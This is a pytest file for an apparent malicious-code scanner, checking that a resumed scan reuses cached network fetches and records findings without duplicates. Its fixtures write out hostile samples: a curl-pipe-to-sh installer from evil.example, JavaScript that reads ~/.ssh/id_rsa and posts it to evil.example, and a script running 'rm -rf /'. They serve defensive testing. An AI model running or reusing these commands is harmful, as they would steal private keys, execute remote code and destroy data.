"""`mcd resume` — re-drive an existing run from its ledger, reusing external work.

Resume reconstructs the original config + target from the ledger (no re-specifying),
clears the derived tables for a clean re-record, and reuses the run dir's fetched-bytes
cache so the (attacker-referenced) network is not hit twice.
"""

from __future__ import annotations

import json
from pathlib import Path

_CURL_PIPE_SH = "#!/bin/sh\ncurl -fsSL https://evil.example/install.sh | sh\n"
_EXFIL_JS = (
    'const http=require("http");\n'
    'const fs=require("fs");\n'
    'const key=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa");\n'
    'http.request({host:"evil.example",method:"POST"}).end(key);\n'
)


def _counting_fetch(counter):
    def _fetch(url, dest_dir, policy=None, *, resolver=None):
        import hashlib
        import os
        from unmask.net import FetchResult
        counter["n"] += 1
        os.makedirs(dest_dir, exist_ok=True)
        out = os.path.join(dest_dir, "payload.js")
        Path(out).write_text(_EXFIL_JS)
        data = _EXFIL_JS.encode()
        return FetchResult(url=url, ok=True, path=out, status=200, bytes_len=len(data),
                           content_type="application/javascript",
                           sha256=hashlib.sha256(data).hexdigest(), final_url=url)
    return _fetch


def test_resume_reuses_fetched_content_without_network(tmp_path, monkeypatch):
    import unmask.net as netpkg
    from unmask import MCDConfig, resume_mcd, run_mcd
    tgt = tmp_path / "tgt"
    tgt.mkdir()
    (tgt / "setup.sh").write_text(_CURL_PIPE_SH)

    counter = {"n": 0}
    monkeypatch.setattr(netpkg, "fetch", _counting_fetch(counter))

    first = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd"), network="fetch-only"))
    assert counter["n"] == 1
    r1 = json.loads(Path(first.report_paths["json"]).read_text())
    comps1 = set(r1["summary"].get("compositions") or [])
    assert {"BP-EXFIL", "BP-CREDTHEFT"} & comps1

    # Resume the SAME run dir: config + target come from the ledger, no re-fetch.
    second = resume_mcd(first.run_dir)
    assert counter["n"] == 1  # network untouched
    assert second.run_id == first.run_id and second.run_dir == first.run_dir
    r2 = json.loads(Path(second.report_paths["json"]).read_text())
    assert set(r2["summary"].get("compositions") or []) == comps1
    assert r2["disposition"]["recommendation"] == r1["disposition"]["recommendation"]
    assert all(f["reused"] for f in r2["fetch"]["fetched"])


def test_resume_is_idempotent_for_offline_run(tmp_path):
    from unmask import MCDConfig, resume_mcd, run_mcd
    tgt = tmp_path / "tgt"
    tgt.mkdir()
    (tgt / "boot.py").write_text('import os\nos.system("rm -rf /")\n')

    first = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    second = resume_mcd(first.run_dir)
    assert second.disposition == first.disposition
    assert second.finding_count == first.finding_count
    # Re-drive re-records cleanly rather than duplicating rows.
    from unmask.ledger import LedgerStore
    led = LedgerStore(str(Path(first.run_dir) / "run.db"))
    try:
        n = led.conn.execute("select count(*) c from findings where run_id=?",
                             (first.run_id,)).fetchone()["c"]
    finally:
        led.close()
    assert n == first.finding_count


def test_resume_unknown_run_dir_errors(tmp_path):
    from unmask import resume_mcd
    (tmp_path / "run.json").write_text('{"runId":"nope","projectId":"p"}')
    # resolve_run_dir needs a nested layout; a bare dir with a bogus run.json fails clearly.
    import pytest
    with pytest.raises(Exception):
        resume_mcd(str(tmp_path))
